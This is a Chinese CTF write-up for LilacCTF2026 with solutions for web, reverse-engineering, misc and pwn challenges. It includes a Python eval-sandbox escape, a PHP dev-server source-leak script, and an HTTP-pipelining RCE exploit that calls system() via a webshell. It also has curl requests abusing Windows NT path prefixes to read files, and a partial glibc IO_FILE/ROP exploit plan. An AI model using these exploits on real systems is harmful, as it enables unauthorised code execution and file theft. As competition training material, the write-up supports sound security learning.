---
title: LilacCTF2026
published: 2026-01-26
pubDate: 2026-01-26
description: LilacCTF2026 zsm Bluebud
pinned: false
tags: ["CTF-web"]
author: zsm
category: web
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

三个人猛冲xctf，感谢队友的带飞，哥们这次纯躺赢狗，misc是`uncle_cui`，pwn是`vrtua`，感谢带飞

## web

### CheckIn

扫路径

![image](./attachments/260126-172015.avif)

http://1.95.156.239:8001/backup.zip泄露了源代码

```python
#Python 3.14.2
import re
from collections import UserList
from sys import argv

class LockedList(UserList):
    def __setitem__(self, key, value):
        raise Exception("Assignment blocked!")

def sandbox():
    if len(argv) != 2:
        print("ERROR: Missing code")
        return

    try:
        status = LockedList([False])
        status_id = id(status)
        user_input = argv[1].encode('idna').decode('ascii').rstrip('-')

        if re.search(r'[0-9A-Z]', user_input):
            print("FORBIDDEN: No numbers or alphas")
            return

        if re.search(r'[_\s=+\[\],"\'\<\>\-\*@#$%^&\\\|\{\}\:;]', user_input):
            print("FORBIDDEN: Incorrect symbol detected")
            return

        if re.search(r'(status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals)', user_input.casefold()):
            print("FORBIDDEN: Keywords detected")
            return

        if len(user_input) > 60:
            print("FORBIDDEN: Input too long! Keep it concise and it is very simple.")
            return

        eval(user_input)

        if status[0] and id(status) == status_id:
            with open('/flag', 'r') as f:
                flag = f.read().strip()
                print(f"SUCCESS! Flag: {flag}")
        else:
            print(f"FAILURE: status is still {status}")

    except Exception as e:
        print(f"Don't be evil~ And I won't show you this error :)")

if __name__ == '__main__':
    sandbox()
```

ai给的payload是

> vars().get(min(vars())).extend(str(vars().get(min(vars())).pop()))

但是长度太长，需要简化，把false变成真值返回列表，pop取出false，那么~false==-1，再append回去触发分支

> vars().get(min(dir())).append(~vars().get(min(dir())).pop())

### keep

啥都没有，扫路径没有内容，尝试PHP<=7.4.21 Development Server源码泄露漏洞

```python
import socket

host, port = "",
payload = f"GET /index.php HTTP/1.1\r\nHost: {host}:{port}\r\n\r\nGET /robots.txt HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()

try:
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(payload)
        print(s.recv(16384).decode(errors="ignore"))
except Exception as e:
    print(e)
```

得到s3Cr37_f1L3.php.bak 是一句话木马，尝试LFI包含没用，尝试pipelining漏洞，把获取.bak的改成post去rce

```python
import socket
import re

class CTFExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.url_path = "/s3Cr37_f1L3.php"
        self.bak_path = "/s3Cr37_f1L3.php.bak"
        self.delimiter = "---EXP_START---"

    def _build_payload(self, cmd):
        # 简化 PHP 逻辑，确保输出干净
        php_code = f"ob_clean(); echo '{self.delimiter}'; system('{cmd}'); die();"
        data = f"admin={php_code}"

        # 构造 HTTP Pipelining 数据包
        # 第一个请求触发环境，第二个请求注入 RCE
        packet = (
            f"GET {self.bak_path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: keep-alive\r\n\r\n"

            f"POST {self.url_path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(data)}\r\n"
            f"Connection: close\r\n\r\n"
            f"{data}"
        )
        return packet

    def execute(self, cmd):
        packet = self._build_payload(cmd)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.host, self.port))
                s.sendall(packet.encode())

                response = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    response += chunk

                return self._parse_response(response.decode(errors='ignore'))
        except Exception as e:
            return f"[x] 通信失败: {e}"

    def _parse_response(self, text):
        # 使用切片定位，比 split 更稳健一点
        if self.delimiter in text:
            return text.split(self.delimiter)[1].strip()
        return None

if __name__ == "__main__":
    # 初始化
    pwner = CTFExploit("", )

    # 执行 ls
    print(f"[*] 正在尝试执行 ls / ...")
    result = pwner.execute("ls /")

    if result:
        print("\n" + "="*20 + " COMMAND OUTPUT " + "="*20)
        print(result)
        print("="*56)
    else:
        print("[-] 响应中未发现标记，建议检查路径或尝试重新运行。")
```

### Path

尝试获取token

```
 curl "http://1.95.51.2:8080/api/diag/read?path=C:\token\access_key.txt"
{"error":"Path validation failed: Path not in allowed directory","success":false}
```

直接访问被ban了，尝试Win32 File Namespace

```
curl "http://1.95.51.2:8080/api/diag/read?path=\\?\C:\token\access_key.txt"
{"error":"Path validation failed: Path not in allowed directory","success":false}
curl "http://1.95.51.2:8080/api/diag/read?path=\\\\?\C:\token\access_key.txt"
{"message":"Access key verified! Here is your Stage 2 token.","success":true,"token":"NWwi4lxJdO8ivs0fEblzufriwNyJNMtUtxVZjmZAAI8","token_expires_in":300}
```

成功读取token，尝试Namespace绕过拿flag，发现被ban，尝试单独的UNC绕过不行，GlobalRoot绕过发现被ban，但是小写没有被过滤掉，改成小写即可

```
curl -G "http://1.95.51.2:8080/api/export/read" \
    --data-urlencode "path=\\?\GlobalRoot\Device\Mup\172.20.0.10\backup\flag.txt" \
    --data-urlencode "token=g6K8QfFuA87goNlM2QZPPMPFEzZwBJJYAxMzW73HaV8"
{"error":"Path validation failed: NT namespace access not allowed","success":false}

curl -G "http://1.95.51.2:8080/api/export/read" \
    --data-urlencode "path=\\\\?\globalroot\device\Mup\172.20.0.10\backup\flag.txt" \
    --data-urlencode "token=fCHSStFIHIarq_9rQDgofDJEyQQg0WRtm3lwd0wgOOk"
{"content":"LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}","size":50,"success":true}
```

## Re

### ezPython

py的exe，解包+pycdc批量反编译，发现myalgo.pyc没有成功反编译，字节码有问题，修复一下再编译，拿到

```python
def u32(x: int) -> int:
    return x & 0xFFFFFFFF


def MX(y: int, z: int, sum_: int, k, p: int, e: int) -> int:
    return (
        (((z >> 5) ^ (y >> 2)) + ((y << 3) ^ (z << 4)))
        ^ ((sum_ ^ y) + (k[(p & 3) ^ e] ^ z))
    )


def btea_encrypt(v: list, n: int, k) -> bool:
    if n <= 1:
        return False

    DELTA = 1163219540
    y = v[0]
    z = v[n - 1]
    sum_ = 0
    q = 6 + 52 // n

    while q > 0:
        q -= 1
        sum_ = u32(sum_ + DELTA)
        e = (sum_ >> 2) & 3

        for p in range(n - 1):
            y = v[p + 1]
            v[p] = u32(v[p] + MX(y, z, sum_, k, p, e))
            z = v[p]

        y = v[0]
        v[n - 1] = u32(v[n - 1] + MX(y, z, sum_, k, n - 1, e))
        z = v[n - 1]

    return True


def btea_decrypt(v: list, n: int, k) -> bool:
    if n <= 1:
        return False

    DELTA = 1163219540
    q = 6 + 52 // n
    sum_ = u32(q * DELTA)

    while sum_ != 0:
        e = (sum_ >> 2) & 3

        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            y = v[p]
            v[p] = u32(v[p] - MX(y, z, sum_, k, p, e))

        # p = 0
        z = v[n - 1]
        y = v[0]
        v[0] = u32(v[0] - MX(y, z, sum_, k, 0, e))

        sum_ = u32(sum_ - DELTA)

    return True

def btea(v: list, n: int, k) -> bool:
    return btea_encrypt(v, n, k)
```

main.py

```python
import struct
from crypto import *
from sys import *
import base64
import myalgo
welcome_msg = 'V2VsYzBtMyBUbyBUaGUgV29ybGQgb2YgTDFsYWMgPDM='
input_msg = ':i(G#8T&KiF<F_)F`JToCggs;'
right_msg = 'UmlnaHQsIGNvbmdyYXR1bGF0aW9ucyE='
wrong_msg = 'V3JvbmcgRmxhZyE='
print(b64decode(welcome_msg).decode())
flag = input(a85decode(input_msg).decode())
if not flag.startswith('LilacCTF{') and flag.endswith('}') or len(flag) == 26:
    print(b64decode(wrong_msg).decode())
else:
    flag = flag[9:25]
    res = [
        761104570,
        1033127419,
        0xDE446C05,
        795718415]
    key = struct.unpack('<IIII', b'1111222233334444')
    input = list(struct.unpack('<IIII', flag.encode()))
    myalgo.btea(input, 4, key)
    if input[0] == res[0] and input[1] == res[1] and input[2] == res[2] and input[3] == res[3]:
        print(b64decode(right_msg).decode())
    else:
        print(b64decode(wrong_msg).decode())
```

ai写exp

```python
import struct


def u32(x: int) -> int:
    return x & 0xFFFFFFFF


DELTA = 0x45555254  # 1163219540


def MX(y: int, z: int, sum_: int, k, p: int, e: int) -> int:
    return u32(
        (((z >> 2) ^ (y << 4)) + ((y >> 5) ^ (z << 3)))
        ^ ((sum_ ^ y) + (k[(p & 3) ^ e] ^ z))
    )


def btea_decrypt(v: list, n: int, k) -> bool:
    if n <= 1:
        return False
    q = 6 + 52 // n
    sum_ = u32(q * DELTA)
    y = v[0]
    while sum_ != 0:
        e = (sum_ >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = u32(v[p] - MX(y, z, sum_, k, p, e))
            y = v[p]
        z = v[n - 1]
        v[0] = u32(v[0] - MX(y, z, sum_, k, 0, e))
        y = v[0]
        sum_ = u32(sum_ - DELTA)
    return True


res = [761104570, 1033127419, 3729026053, 795718415]
key = struct.unpack("<IIII", b"1111222233334444")

v = res[:]  # copy
btea_decrypt(v, 4, key)

mid = struct.pack("<IIII", *v).decode()  # 16 bytes -> 16 ASCII chars
print("mid =", mid)
print("flag =", f"LilacCTF{{{mid}}}")
```

### NineApple

ida+mcp一把梭了

```python
python3 - <<'PY'
weights=[0x275B6F7FF,0x3479E9FF,0x40960C4,0x49D00E,0x4EBBC,0x4EBB,0x4A1,0x41,0x3]
char_to_pattern={
    "L":"1478",
    "i":"582",
    "l":"147",
    "a":"2147859",
    "c":"6589",
    "{":"248",
    "1":"125879",
    "0":"2587413",
    "S":"321456987",
    "_":"789",
    "/":"27",
    "\\":"18",
    "N":"7415963",
    "d":"825479",
    "w":"1475963",
    "n":"4758",
    "3":"23598",
    "f":"21745",
    "r":"475",
    "y":"14257",
    "o":"58746",
    "u":"47869",
    "}":"157",
    "2":"125478",
    "4":"14528",
    "5":"214587",
    "6":"458712",
    "7":"1238",
    "9":"893256",
    "A":"74269",
    "G":"32478965",
    "V":"183",
    "T":"13258",
    "P":"45217",
    "M":"7418369",
    "W":"1472963",
    "Q":"42689",
    "H":"1745639",
    "K":"24718",
}
pattern_to_char={v:k for k,v in char_to_pattern.items()}

def key_for(pattern:str)->int:
    return sum(weights[i]*int(d) for i,d in enumerate(pattern))

key_to_pattern={key_for(p):p for p in pattern_to_char.keys()}

target_all_hex=[
    "c7c52e6603000000",
    "7be974f80d000000",
    "5745e06303000000",
    "9f1e3b3205000000",
    "93b88eeb0f000000",
    "1a9ea0dd05000000",
    "f8664df502000000",
    "0944331406000000",
    "cbfb63cf07000000",
    "d57e240013000000",
    "9f1e3b3205000000",
    "e010910f12000000",
    "b9ee262c14000000",
    "d57e240013000000",
    "5745e06303000000",
    "f8664df502000000",
    "5745e06303000000",
    "9f1e3b3205000000",
    "93b88eeb0f000000",
    "d57e240013000000",
    "7e857f6503000000",
    "f8664df502000000",
    "39aaae5c0b000000",
    "2d40ca9f05000000",
    "d57e240013000000",
    "3d5a693d05000000",
    "0944331406000000",
    "c929605a0b000000",
    "d57e240013000000",
    "ede3445103000000",
    "ef93e80d0e000000",
    "057663680b000000",
    "562f5a9803000000",
]

def u64le(h):
    return int.from_bytes(bytes.fromhex(h), 'little')

flag=[]
patterns=[]
missing=[]
for i,h in enumerate(target_all_hex):
    k=u64le(h)
    p=key_to_pattern.get(k)
    if not p:
        missing.append((i,hex(k)))
        flag.append('?')
        patterns.append(None)
        continue
    patterns.append(p)
    flag.append(pattern_to_char[p])

print('missing', missing)
print('patterns', patterns)
print('flag', ''.join(flag))
PY
```

### JustROM

ida里面选择SPARC Big-endian 32-bit
ROM base：0x10800000 size: 0x10000
RAM base: 0x107F0000 size: 0x10000
进去0x10800000 按c，然后往下继续，可以拿到类似的内容

![image](./attachments/260126-172549.avif)

调整一下，RAM base: 0x107F0000 size: 0x14000,全部丢给ai，给我写了一个找不到key的版本，尝试爆破key在哪，反正时间有的是，在0xc000

```python
import struct
from pathlib import Path

# --- 1. 配置信息 ---
ROM_PATH = "/Users/zsm/Downloads/rom.bin"  # 请确保你的文件名是这个
SIGMA_OFFSET = 0x4018  # 对应汇编中的 10804018
KEY_OFFSET = 0xC000

# --- 2. 目标数据 (Target) ---
PLAINTEXT = b"There_is_nothing_you_wanna_get.."
MASK_WORDS = [
    0x37329BF6,
    0x36A918FC,
    0xF2E74973,
    0x6149F8D4,  # 0xF2E74973 是汇编中 -0xD18B68D 的补码
    0x4CF26AC9,
    0x3C4C6283,
    0x78125C05,
    0x5F30959D,
]

# ChaCha 参数
COUNTER = 1
NONCE = (0x41414141, 0x42424242, 0x43434343)


# --- 3. 核心算法 ---
def rotl32(x, n):
    x &= 0xFFFFFFFF
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))


def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF
    x[d] = rotl32(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF
    x[b] = rotl32(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xFFFFFFFF
    x[d] = rotl32(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xFFFFFFFF
    x[b] = rotl32(x[b] ^ x[c], 7)


def chacha8_block(sigma_words, key_words, counter, nonce_words):
    # 初始化状态矩阵 (16个32位字)
    state = list(sigma_words) + list(key_words) + [counter] + list(nonce_words)
    initial_state = state[:]

    # 运行 8 轮 (4 次双轮)
    for _ in range(4):
        # 列置换
        quarter_round(state, 0, 4, 8, 12)
        quarter_round(state, 1, 5, 9, 13)
        quarter_round(state, 2, 6, 10, 14)
        quarter_round(state, 3, 7, 11, 15)
        # 对角线置换
        quarter_round(state, 0, 5, 10, 15)
        quarter_round(state, 1, 6, 11, 12)
        quarter_round(state, 2, 7, 8, 13)
        quarter_round(state, 3, 4, 9, 14)

    # 状态累加
    out = [(state[i] + initial_state[i]) & 0xFFFFFFFF for i in range(16)]

    # 【关键修正点】：即使 CPU 是大端序，ChaCha 密钥流输出的标准通常是小端序字节
    return b"".join(struct.pack("<I", x) for x in out)


def try_decrypt(rom, off):
    if off + 32 > len(rom):
        return None

    # 提取 Key (从 ROM 读取时使用大端序)
    key_bytes = rom[off : off + 32]
    key_words = struct.unpack(">8I", key_bytes)

    # 提取 Sigma 常量 (从 ROM 读取时使用大端序)
    sigma_bytes = rom[SIGMA_OFFSET : SIGMA_OFFSET + 16]
    sigma_words = struct.unpack(">4I", sigma_bytes)

    # 生成密钥流
    keystream = chacha8_block(sigma_words, key_words, COUNTER, NONCE)

    # 构造 Target
    mask_bytes = b"".join(struct.pack(">I", w) for w in MASK_WORDS)
    target = bytes(p ^ m for p, m in zip(PLAINTEXT, mask_bytes))

    # 还原 Flag: Input = Target ^ Keystream
    flag = bytes(t ^ k for t, k in zip(target, keystream[:32]))

    # 验证格式
    if b"LilacCTF{" in flag and flag.endswith(b"}"):
        return "".join(chr(b) for b in flag if 32 <= b < 127)
    return None


def main():
    if not Path(ROM_PATH).exists():
        print(f"[-] Error: {ROM_PATH} not found.")
        return

    rom = Path(ROM_PATH).read_bytes()

    # 1. 尝试已知偏移量 0xC000
    print(f"[*] Testing known offset 0x{KEY_OFFSET:X}...")
    res = try_decrypt(rom, KEY_OFFSET)
    if res:
        print(f"[+] Found Flag: {res}")
        return

    # 2. 如果失败，全文件爆破
    print("[*] Known offset failed. Bruteforcing all offsets...")
    for off in range(0, len(rom) - 32, 4):
        res = try_decrypt(rom, off)
        if res:
            print(f"[+] Found Flag at offset 0x{off:X}: {res}")
            return

    print("[-] Flag not found. Please check SIGMA_OFFSET and rom.bin content.")


if __name__ == "__main__":
    main()
```

## Misc

### Welcome

赛博厨子连点两下魔法棒就行

### Your GitHub, mine

发现只要在issues中@lilacctf-tech,就可以Check到flag

### launchpad

ai一把梭

![image](./attachments/260126-172731.avif)

### Sky Is Ours

根据机翼涂装和飞机特征可以判断这是青岛航空的空客320，看沿海那里，可以明显看到是国内北方的海岸线，而且有个突出半岛，加上青岛航空，推测这里是山东的海岸线，找出青岛航空国内过山东海边的航班，发现有一班从哈尔滨到蓬莱的飞机，当时我感觉可能是这班，因为是哈工大出题的（），但是不太确定，就去谷歌地图找航线重合的海岸线，发现与该处十分相近，

![image](./attachments/260126-172812.avif)

![image](./attachments/260126-172822.avif)

## pwn

### na1vm

程序分父子两部分，父进程设置完通信管道后执行`fork()` + `execl("child")`
父进程无任何可利用点，其本质只是和子进程的交互通道

```c
// structure of a single opcode
struct opcode {
    uint8 op;
    uint8 dstReg;
    uint8 srcReg;
    uint16 offSet;
    uint32 val;
}
```

子进程由vm任务队列和vm处理函数组成

```c
// 任务队列累加函数
__int64 __fastcall child_queue_push(unsigned __int64 cmd)
{
  unsigned __int8 i; // al
  unsigned __int8 capacity; // cl
  __int64 v3; // rdx
  unsigned __int8 tail_add_one; // dl
  unsigned __int8 tail_add_one_; // dl

  i = g_task_queue.count;
  capacity = g_task_queue.capacity;
  v3 = -1;
  if ( g_task_queue.count < g_task_queue.capacity )
  {
    tail_add_one = g_task_queue.tail;
    g_task_queue.entries[g_task_queue.tail] = cmd;
    tail_add_one_ = tail_add_one + 1;
    if ( capacity <= tail_add_one_ )
    {
      g_task_queue.tail = 0;
      g_task_queue.capacity = 0x80;
      ++g_task_queue.epoch;
    }
    else
    {
      g_task_queue.tail = tail_add_one_;
    }
    g_task_queue.count = i + 1;
    return g_task_queue.epoch * g_task_queue.capacity + g_task_queue.tail - 1;
  }
  return v3;
}
```

```c
// vm 主逻辑
void __fastcall child_execute_pending()
{
  unsigned __int8 i; // cl
  union sigval val; // rdi
  unsigned __int64 n0xE; // rcx
  unsigned int *p_g_task_queue; // rax
  unsigned __int64 n0xE_1; // rcx
  unsigned int *p_g_task_queue_1; // rax
  unsigned int g_task_queue; // eax
  __int64 v7; // rdi
  __int64 v8; // rdi
  unsigned int v9; // r15d
  int v10; // edx
  unsigned int *v11; // rax
  unsigned int v12; // r15d
  int v13; // edx
  unsigned int *v14; // rax
  unsigned __int64 vm_stack_ptr; // rbp
  unsigned __int64 opcode; // rbp
  unsigned __int8 n0x40; // dl
  unsigned __int8 head; // al
  unsigned int v19; // [rsp+4h] [rbp-54h]
  unsigned int v20; // [rsp+4h] [rbp-54h]
  unsigned int v21; // [rsp+4h] [rbp-54h]
  unsigned int v22; // [rsp+4h] [rbp-54h]
  int v23; // [rsp+14h] [rbp-44h] BYREF
  unsigned __int64 v24; // [rsp+18h] [rbp-40h]

  v24 = __readfsqword(0x28u);
  for ( i = ::g_task_queue.count; i; i = ::g_task_queue.count )
  {
    opcode = ::g_task_queue.entries[::g_task_queue.head] & 0xFFFFFFFFFFFFFFLL;
    n0x40 = HIBYTE(::g_task_queue.entries[::g_task_queue.head]);
    head = ::g_task_queue.head + 1;
    if ( (unsigned __int8)(::g_task_queue.head + 1) >= ::g_task_queue.capacity )
      head = 0;
    ::g_task_queue.head = head;
    ::g_task_queue.count = i - 1;
    if ( n0x40 > 0x40u )
    {
LABEL_3:
      val.sival_ptr = (void *)-2LL;
      if ( n0x40 == 0x80 )
      {
        if ( HIDWORD(auth_state) == (_DWORD)opcode )// pass auth check -> dead lock
        {
          while ( 1 )
            ;
        }
        val.sival_ptr = (void *)-2LL;
      }
    }
    else
    {
      switch ( n0x40 )
      {
        case 0u:                                // read + write back mem
          v23 = WORD2(opcode);
          n0xE = opcode >> 52;
          if ( (HIWORD(opcode) & 0xF) == 0xF || (unsigned int)n0xE > 0xE )
          {
            val.sival_ptr = (void *)-3LL;
          }
          else
          {
            p_g_task_queue = (unsigned int *)((char *)::vm_stack_ptr + WORD2(opcode));
            if ( p_g_task_queue < (unsigned int *)&::g_task_queue
              && p_g_task_queue >= (unsigned int *)&::g_task_queue - 0x4000 )
            {
              vm_reg_u32[HIWORD(opcode) & 0xF] = *p_g_task_queue;
              vm_reg_u32[n0xE] = opcode;
              val.sival_ptr = (void *)((unsigned int)opcode | ((unsigned __int64)*p_g_task_queue << 32));
              *p_g_task_queue = opcode;
            }
            else
            {
              val.sival_ptr = (void *)-1LL;
            }
          }
          break;
        case 1u:                                // read mem
          v23 = WORD2(opcode);
          n0xE_1 = opcode >> 52;
          if ( (HIWORD(opcode) & 0xF) == 0xF || (unsigned int)n0xE_1 > 0xE )
          {
            val.sival_ptr = (void *)-3LL;
          }
          else
          {
            p_g_task_queue_1 = (unsigned int *)((char *)::vm_stack_ptr + WORD2(opcode));
            if ( p_g_task_queue_1 < (unsigned int *)&::g_task_queue
              && p_g_task_queue_1 >= (unsigned int *)&::g_task_queue - 0x4000 )
            {
              vm_reg_u32[HIWORD(opcode) & 0xF] = opcode;
              g_task_queue = *p_g_task_queue_1;
              vm_reg_u32[n0xE_1] = g_task_queue;
              val.sival_ptr = (void *)(g_task_queue | (opcode << 32));
            }
            else
            {
              val.sival_ptr = (void *)-1LL;
            }
          }
          break;
        case 2u:                                // mov reg, val; add obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-3LL;
          if ( (HIWORD(opcode) & 0xF) != 0xF )
          {
            v19 = vm_reg_u32[opcode >> 52];
            v7 = (unsigned int)opcode + ((unsigned int)child_prng_step_u16((unsigned __int16 *)&v23) ^ v19);
            vm_reg_u32[HIWORD(opcode) & 0xF] = v7;
            val.sival_ptr = (void *)(vm_reg_u32[opcode >> 52] | (unsigned __int64)(v7 << 32));
          }
          break;
        case 3u:                                // mov reg, val; sub obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-3LL;
          if ( (HIWORD(opcode) & 0xF) != 0xF )
          {
            v20 = vm_reg_u32[opcode >> 52];
            v8 = ((unsigned int)child_prng_step_u16((unsigned __int16 *)&v23) ^ v20) - (unsigned int)opcode;
            vm_reg_u32[HIWORD(opcode) & 0xF] = v8;
            val.sival_ptr = (void *)(vm_reg_u32[opcode >> 52] | (unsigned __int64)(v8 << 32));
          }
          break;
        case 0x3Fu:
          val.sival_ptr = (void *)-2LL;
          break;
        case 8u:                                // push val; add obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-1LL;
          if ( ::vm_stack_ptr != (unsigned int *)&::g_task_queue )
          {
            v9 = vm_reg_u32[opcode >> 52] ^ vm_reg_u32[HIWORD(opcode) & 0xF];
            v10 = child_prng_step_u16((unsigned __int16 *)&v23);
            v11 = ::vm_stack_ptr++;
            *v11 = opcode + (v10 ^ v9);
            val.sival_ptr = (void *)*::vm_stack_ptr;
          }
          break;
        case 9u:                                // push val; add obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-1LL;
          if ( ::vm_stack_ptr != (unsigned int *)&::g_task_queue )
          {
            v12 = vm_reg_u32[opcode >> 52] ^ vm_reg_u32[HIWORD(opcode) & 0xF];
            v13 = child_prng_step_u16((unsigned __int16 *)&v23);
            v14 = ::vm_stack_ptr++;
            *v14 = (v13 ^ v12) - opcode;
            val.sival_ptr = (void *)*::vm_stack_ptr;
          }
          break;
        case 0xAu:                              // pop reg; add obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-1LL;
          if ( ::vm_stack_ptr != (unsigned int *)vm_memory )
          {
            val.sival_ptr = (void *)-3LL;
            if ( (HIWORD(opcode) & 0xF) != 0xF )
            {
              v21 = *::vm_stack_ptr ^ vm_reg_u32[opcode >> 52];
              val.sival_int = opcode + (child_prng_step_u16((unsigned __int16 *)&v23) ^ v21);
              vm_reg_u32[HIWORD(opcode) & 0xF] = val.sival_int;
              val.sival_ptr = (void *)(unsigned int)val.sival_int;
              --::vm_stack_ptr;
            }
          }
          break;
        case 0xBu:                              // pop reg; sub obf
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-1LL;
          if ( ::vm_stack_ptr != (unsigned int *)vm_memory )
          {
            val.sival_ptr = (void *)-3LL;
            if ( (HIWORD(opcode) & 0xF) != 0xF )
            {
              v22 = *::vm_stack_ptr ^ vm_reg_u32[opcode >> 52];
              val.sival_int = (child_prng_step_u16((unsigned __int16 *)&v23) ^ v22) - opcode;
              vm_reg_u32[HIWORD(opcode) & 0xF] = val.sival_int;
              val.sival_ptr = (void *)(unsigned int)val.sival_int;
              --::vm_stack_ptr;
            }
          }
          break;
        case 0x10u:                             // leak stack or reg val; req auth
          v23 = WORD2(opcode);
          val.sival_ptr = (void *)-2LL;
          if ( HIDWORD(auth_state) == (_DWORD)opcode )
          {
            if ( (opcode & 0xF000000000000LL) != 0 )
              vm_stack_ptr = (unsigned __int64)::vm_stack_ptr;
            else
              vm_stack_ptr = vm_reg_u32[opcode >> 52];
            val.sival_ptr = (void *)(vm_stack_ptr ^ (unsigned int)child_prng_step_u16((unsigned __int16 *)&v23));
          }
          break;
        case 0x40u:                             // reset queue; req auth
          val.sival_ptr = (void *)-2LL;
          if ( HIDWORD(auth_state) == (_DWORD)opcode )
          {
            memset(&::g_task_queue, 0, sizeof(::g_task_queue));
            ::g_task_queue.capacity = 0x80;
            val.sival_ptr = 0;
          }
          break;
        default:
          goto LABEL_3;
      }
    }
    child_sigqueue_parent(val);
  }
}
```

```c
// 混淆函数
__int64 __fastcall child_prng_step_u16(unsigned __int16 *a1)
{
  unsigned int v1; // edx
  __int64 result; // rax

  v1 = (*a1
      ^ (*a1 >> 11)
      ^ ((*a1 ^ (*a1 >> 11)) << 7)
      & 0x9D2C5680
      ^ ((*a1 ^ (*a1 >> 11) ^ ((*a1 ^ (*a1 >> 11)) << 7) & 0x9D2C5680) << 15)
      & 0xEFC60000) >> 18;
  result = v1
         ^ (unsigned int)auth_state
         ^ *a1
         ^ (*a1 >> 11)
         ^ ((*a1 ^ (*a1 >> 11)) << 7)
         & 0x9D2C5680
         ^ ((*a1 ^ (*a1 >> 11) ^ ((*a1 ^ (*a1 >> 11)) << 7) & 0x9D2C5680) << 15)
         & 0xEFC60000;
  LODWORD(auth_state) = v1
                      ^ auth_state
                      ^ *a1
                      ^ (*a1 >> 11)
                      ^ ((*a1 ^ (*a1 >> 11)) << 7)
                      & 0x9D2C5680
                      ^ ((*a1 ^ (*a1 >> 11) ^ ((*a1 ^ (*a1 >> 11)) << 7) & 0x9D2C5680) << 15)
                      & 0xEFC60000;
  return result;
}
```

vm提供了push, pop, 限制范围内读写等操作。大部分操作都被一个混淆wrapper (child_prng_step_u16)包裹，其通过从urandom读的8字节的低32位和参数1进行一系列异或操作，最后再交还给主逻辑接着运行。这会更改用户输入的内容和运行结果响应码，使得利用极其困难。同时来自urandom的8字节的高32位被用作几个特殊指令的校验码。

vm主逻辑有很多检查，几乎找不到可利用的越界写点，除了opcode->0处的限制范围读写没有将地址对齐，这导致如果输入0xFFFF可以从vm_memory溢出三个字节到g_task_queue结构体。回顾队列累加逻辑，发现如果能控制tail和count即可实现很大范围内的写原语，同时写完如果写的地址和g_task_queue的距离大于0x80 \* 8程序还会自动将tail复位成0方便下次任意写。

于是先用写原语重写auth_state为\x00 \* 8绕过混淆wrapper，然后用opcode->0xA0泄露程序基址。

虽然子程序的三个io都被关闭了，但是用的不是标准close函数而是fclose，也就是说它们只丢失了各自的fd，io链还是可以正常利用的。同时注意到程序中有可控的exit触发，于是通过把vm_sp_ptr改到stderr\*附近泄露libc，然后覆写其指向可控地址，最后打exit->fflush触发链。

利用libc + 0x017A915处的magic_gadget配合setcontext打rop，最后写shellcode orw即可。

```
.text:000000000017A915 018 48 8B 57 08   mov     rdx, qword ptr [rdi+8]
.text:000000000017A919 018 48 89 45      mov     qword ptr [rbp-8], rax
.text:000000000017A91D 018 FF 52 20      call    qword ptr [rdx+0x20]
```

当然这里不能用write，需要给主程序发sigqueue实现输出。

```python
from pwnfunc import *

script = """
set follow-fork-mode child
set detach-on-fork off
catch exec
"""

class IO_FILE_plus_struct:
    def __init__(self):
        self.fields = {
            0x0:   0,    # _flags
            0x8:   0,    # _IO_read_ptr
            0x10:  0,    # _IO_read_end
            0x18:  0,    # _IO_read_base
            0x20:  0,    # _IO_write_base
            0x28:  0,    # _IO_write_ptr
            0x30:  0,    # _IO_write_end
            0x38:  0,    # _IO_buf_base
            0x40:  0,    # _IO_buf_end
            0x48:  0,    # _IO_save_base
            0x50:  0,    # _IO_backup_base
            0x58:  0,    # _IO_save_end
            0x60:  0,    # _markers
            0x68:  0,    # _chain
            0x70:  0,    # _fileno & _flags2 (4+4 bytes)
            0x78:  0,    # _old_offset
            0x80:  0,    # _cur_column, _vtable_offset, _shortbuf
            0x88:  0,    # _lock
            0x90:  0,    # _offset
            0x98:  0,    # _codecvt
            0xa0:  0,    # _wide_data
            0xa8:  0,    # _freeres_list
            0xb0:  0,    # _freeres_buf
            0xb8:  0,    # __pad5
            0xc0:  0,    # _mode & _unused2
            0xd8:  0     # vtable
        }

    def __setattr__(self, name, value):
        mapping = {
            '_flags': 0x0,
            '_IO_read_ptr': 0x8,
            '_IO_read_end': 0x10,
            '_IO_read_base': 0x18,
            '_IO_write_base': 0x20,
            '_IO_write_ptr': 0x28,
            '_IO_write_end': 0x30,
            '_IO_buf_base': 0x38,
            '_IO_buf_end': 0x40,
            '_IO_save_base': 0x48,
            '_IO_backup_base': 0x50,
            '_IO_save_end': 0x58,
            '_markers': 0x60,
            '_chain': 0x68,
            '_fileno': 0x70,
            '_lock': 0x88,
            '_offset': 0x90,
            '_codecvt': 0x98,
            '_wide_data': 0xa0,
            '_mode': 0xc0,
            'vtable': 0xd8
        }
        if name in mapping:
            self.fields[mapping[name]] = value
        else:
            super().__setattr__(name, value)

    def __bytes__(self):
        return flat(self.fields, word_size=64)

io, elf, libc = pwn_initial(gdb_script = script)
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
